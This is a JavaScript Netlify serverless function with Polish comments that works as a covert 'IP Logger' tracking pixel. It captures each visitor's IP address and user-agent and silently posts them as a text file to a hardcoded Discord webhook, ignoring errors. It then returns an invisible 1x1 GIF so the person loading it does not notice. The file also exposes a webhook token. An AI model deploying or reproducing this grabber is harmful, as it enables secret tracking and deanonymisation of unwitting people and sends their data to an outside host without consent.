// netlify/functions/save-ip-txt.js

export default async (request) => {
    // Najlepsze sposoby pobrania prawdziwego IP na Netlify
    let ip =
        request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
        request.headers.get("cf-connecting-ip") ||
        request.headers.get("x-real-ip") ||
        "unknown";

    const ua = request.headers.get("user-agent") || "brak informacji";
    const now = new Date().toISOString();

    const txtContent = [
        `IP Logger - ${now}`,
        "──────────────────────────────",
        `Adres IP:     ${ip}`,
        `User-Agent:   ${ua}`,
        `Czas:         ${now}`,
        "──────────────────────────────",
        "",
    ].join("\n");

    const webhook = "https://discord.com/api/webhooks/1460323910787530907/J0NXhcXMEpvHMYpKVwmH3ebjYXSitXJ-GX5N8ugXYq56hOTZre5unG6Uqqv329UhOHHp";

    const form = new FormData();
    form.append(
        "file",
        new Blob([txtContent], { type: "text/plain" }),
        `ip_${ip.replace(/\./g, "-")}_${Date.now()}.txt`
    );
    form.append("content", `Nowy plik z IP (${ip})`);

    // Wysyłamy – cicho ignorujemy błędy
    fetch(webhook, {
        method: "POST",
        body: form,
    }).catch(() => {});

    // Zwracamy niewidoczny 1×1 piksel GIF
    const transparentGif = Buffer.from(
        "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
        "base64"
    );

    return new Response(transparentGif, {
        status: 200,
        headers: {
            "Content-Type": "image/gif",
            "Cache-Control": "no-store",
        },
    });
};